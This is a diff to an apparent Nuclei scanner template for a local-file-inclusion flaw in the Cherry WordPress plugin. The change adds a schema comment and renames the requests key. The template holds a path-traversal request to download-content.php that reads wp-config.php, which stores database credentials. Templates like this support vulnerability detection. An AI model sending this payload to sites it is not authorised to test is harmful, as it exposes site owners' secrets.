@@ -1,3 +1,4 @@
+# yaml-language-server: $schema=https://raw.githubusercontent.com/projectdiscovery/nuclei/dev/pkg/templates/nuclei-jsonschema.json
 id: cherry-lfi
 
 info:
@@ -10,7 +11,7 @@ info:
     - https://support.alertlogic.com/hc/en-us/articles/115003048083-06-19-17-WordPress-CMS-Cherry-Plugin-Arbitrary-File-Upload-RCE
   tags: wordpress,wp-plugin,lfi,wp
 
-requests:
+http:
   - method: GET
     path:
       - '{{BaseURL}}/wp-content/plugins/cherry-plugin/admin/import-export/download-content.php?file=../../../../../wp-config.php'
